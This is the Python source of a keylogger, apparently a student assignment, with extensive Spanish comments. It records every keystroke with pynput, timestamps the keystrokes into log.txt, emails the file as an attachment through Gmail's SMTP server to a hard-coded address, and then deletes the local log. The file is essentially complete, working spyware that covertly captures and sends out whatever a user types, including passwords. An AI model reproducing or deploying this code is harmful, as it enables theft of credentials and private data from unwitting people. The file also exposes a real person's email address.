# -*- coding: utf-8 -*-
# import pyHook, pythoncom, sys, logging, time, datetime
import os #Proporciona funciones para crear y eliminar un directorio (carpeta), recuperar su contenido, cambiar e identificar el directorio actual
import sys #sys Permite operar sobre el intérprete y proporciona acceso a las variables y funciones que interactúan fuertemente con el intérprete.
import datetime #Python Datetime proporciona clases para trabajar con fecha y hora.
import time #Python time proporciona una funcionalidad distinta a la de representar el tiempo, como esperar durante la ejecución del código y medir la eficiencia de su código.
import pynput #contiene clases para controlar y monitorear el teclado. 
from pynput.keyboard import Key, Listener #Predeterminado llamar a Listener usando on_message_received.
import smtplib #Define sesión de cliente SMTP para enviar correo electronico .
import keyboard #Para simular pulsaciones de teclas.

import smtplib, ssl
import getpass #El módulo getpass proporciona una forma independiente de la plataforma para ingresar una contraseña en un programa de línea de comandos

#El paquete de correo electrónico es una biblioteca para administrar mensajes de correo electrónico diseñado para enviar mensajes de correo electrónico a SMTP (RFC 2821), NNTP u otros servidores; esas son funciones de módulos como smtplib y nntplib. 
#El paquete de correo electrónico intenta ser lo más compatible con RFC posible, admitiendo RFC 5322 y RFC 6532, así como RFC relacionados con MIME como RFC 2045, RFC 2046, RFC 2047, RFC 2183 y RFC 2231.
from email import encoders 
from email.mime.base import MIMEBase 
from email.mime.text import MIMEText 
from email.mime.multipart import MIMEMultipart #Módulo: email.mime.multipart. Una subclase de MIMEBase, esta es una clase base intermedia para mensajes MIME que son de varias partes. El valor predeterminado de _subtype opcional es mixto, pero se 
#puede usar para especificar el subtipo del mensaje. Se agregará un encabezado de tipo de contenido de multipart/_subtype al objeto de mensaje.

# carpeta_destino= 'C:\\Users\\augus\\Desktop\\8 Semestre\\SIN-811\\KeyLoggerYT\\KeyloggerYT.txt'

#def regsitradorTeclado(event):
    #logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')
    #print('WindowName:', event.WindowName)
    #print('Window:', event.Key)
    #print('Key:', event.Key)
    #logging.log(10, event.Key)
    #return True

#hooks_manager = pyHook.HookManager()
#hooks_manager.KeyDowm= regsitradorTeclado
#hooks_manager.HookKeyboard()

#while True:
    #pythoncom.PumpWaitingMessages()

def correo_electronico():
    usuario = "" #
    password = "" #contraseña
    
    destino = "scze.augustocesar.toro.bl@unifranz.edu.bo"
    asunto="INFORME KEYLOGGER SIN-811"
    
    #caca creamos el contenido del correo electronico
    envio = MIMEMultipart("alternative") #estandar
    envio["Subject"] = asunto
    envio["From"] = usuario
    envio["To"] = destino
    
    html = f"""
    <html>
    <body>
        Hola {destino}<br>
        Aca esta el reporte del Keylogger para la materia AIN-811 <b>De Nada</b> :)
    </body>
    </html>
    """
    #contenido del mensaje como html
    cont_html= MIMEText(html, "html")

    # #agregar ese contenido al mensaje
    envio.attach(cont_html)
    archivo="log.txt"
    with open(archivo, "rb") as adjunto:
        cont_attach = MIMEBase("application", "octet-stream") #El tipo MIME application/octet-stream se utiliza para archivos binarios desconocidos, 
        #conserva el contenido del archivo, a partir de la extensión del nombre del archivo.
        
        cont_attach.set_payload(adjunto.read())
        encoders.encode_base64(cont_attach)
        cont_attach.add_header(
            "Content-Disposition", #Content-Disposition es un encabezado que indica si se espera que el 
            #contenido se muestre en línea en el navegador, es decir, como una página web o como parte de una página web, 
            # o como un archivo adjunto, que se descarga y guarda localmente
            f"attachment; filename= {archivo}",
            )
        envio.attach(cont_attach)
        mensaje_completo = envio.as_string()
    
        #generamos una conexion ssl
        context = ssl.create_default_context() 
        # Secure Sockets Layer (SSL) es la tecnología de seguridad estándar para establecer un enlace cifrado entre un servidor 
        # y un cliente, en este caso un servidor de correo y un cliente de correo
        # SSL usa el número de puerto 443, cifra los datos intercambiados entre el navegador y el servidor y autentica el usuario.
        # Cuando las comunicaciones entre el navegador web y el servidor deben ser seguras, el navegador cambia automáticamente
        # a SSL, es decir, siempre que el servidor tenga un certificado SSL instalado.

        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server: 
            # Ports 465 are intended for email client to email server communication - sending out email using SMTP protocol. 
            # Port 465 is for smtps. SSL encryption is started automatically before any SMTP level communication
            server.login(usuario,password)
            print("Keylogger RE-iniciado")
            server.sendmail(usuario, destino, mensaje_completo)
            print("Enviado: Reporte")

enter=0
teclas=[]
active=0
arr=[]

def pulsaciones(key):
    global teclas,enter,active,arr #global permite modificar la variable y realizar cambios en la variable en un contexto local.

    if key == Key.enter: #El método keys() devuelve un objeto de vista.

        for i in range(len(teclas)): 
            # El range() es una función que devuelve una secuencia que comienza desde cero y se incrementa en 
            # 1 de forma predeterminada y se detiene antes del número dado
            
            if active %2 !=0:
                teclas[i] = str(teclas[i]).upper() 
                # la función str() se usa para convertir un cierto valor en 
                # una cadena. Toma un objeto como argumento y lo convierte en una cadena.

            if teclas[i] == "+":
                active+=1

        # El range() es una función incorporada en Python. Devuelve una secuencia de números que comienza desde cero y se incrementa en 
        # 1 de forma predeterminada y se detiene antes del número dado.
        
        for i in range(len(teclas)):
            if teclas[i]=="+":
                pass
            else:
                arr.append(teclas[i])

        teclas=arr

        teclas.append("\n")

        write_file(teclas,enter)
        teclas=[]
        arr=[]
        
        #Aca fijamos apartir de cuantos "enter" se genera un informe
        enter+=1
        if enter>1:
            correo_electronico() #llamamos a la clase: def correo_electronico
            if os.path.exists("log.txt"): 
                # exist() o path. El método exist()utiliza para verificar si existe la ruta especificada.
                # La ruta especificada puede ser un archivo o una carpeta donde se encuentre el archivo os.
                os.remove("log.txt") # El método remove () en Python se usa para eliminar o eliminar una ruta de archivo.
            enter=0 # fijamos "enter" nuevamente a 0

    # append en Python es un método predefinido que se usa para agregar un solo elemento. 
    # Sin el método de agregar, los desarrolladores tendrían que modificar el código de toda la colección para agregar un solo valor o 
    # elemento.    
    elif teclas=='"':
        teclas.append('"')
    elif key== Key.shift_r:
        teclas.append("")
        
    elif key== Key.ctrl_l:
        teclas.append("")

    elif key == Key.space:
        teclas.append(" ")  

    elif key == Key.backspace:
        if len(teclas)==0:
            pass
        else:
            teclas.pop(-1)

    elif key == Key.caps_lock:
        teclas.append("+")

    else:
        teclas.append(key)

    print("{0}".format(key))

# en esta clase escribimos el reporte en un archivo .txt 
def write_file(teclas,enter): # La función open() abre el archivo (si es posible) y devuelve el objeto de archivo correspondiente.
    with open("log.txt", "a") as f:
        f.write(time.strftime("%d/%m/%y   ")) 
        # El método strftime() convierte una struct_time que representa un tiempo devuelto por 
        # gmtime() o localtime() en una cadena según lo especificado por el argumento de formato, en este caso el argumenta 
        # indica al formato: dia/mes/year 
        
        # Escribimos el localtime con el siguiente formato: 
        # Hour (12-hour clock) as a zero-padded decimal number.	01, 02, ..., 12, 
        # Minute as a zero-padded decimal number.	00, 01, ..., 59
        # Second as a zero-padded decimal number.	00, 01, ..., 59   
        f.write(time.strftime("%I:%M:%S   "))
        
        for key in teclas:
            k=str(key).replace("'","")

            if k.find("\n")>0:
                f.write(k)

            # elif key.find('"a')>0:
            #     f.write()
                
            elif k.find('Key')== -1:
                f.write(k)
            
        
def on_release(key):
    
    if key == Key.esc:
        return False #interrumpe el programa 
    
def main(): # La función principal en Python actúa como el punto de ejecución de cualquier programa.
    if os.path.exists("log.txt"): #os verifica si existe log.txt, si es = verdad entonces "os" procede a eliminar 
        #el log.txt ya que los datos fueron mandsdos al correo-e senalado 
        os.remove("log.txt")
    else:  
        pass 
    # En Python, pass es una declaración nula. El intérprete no ignora una declaración de paso, pero no sucede nada y 
    # la declaración no da como resultado ninguna operación.
    
    with Listener(on_press=pulsaciones, on_release=on_release) as listener:
        listener.join()
    
if __name__== '__main__':
    main()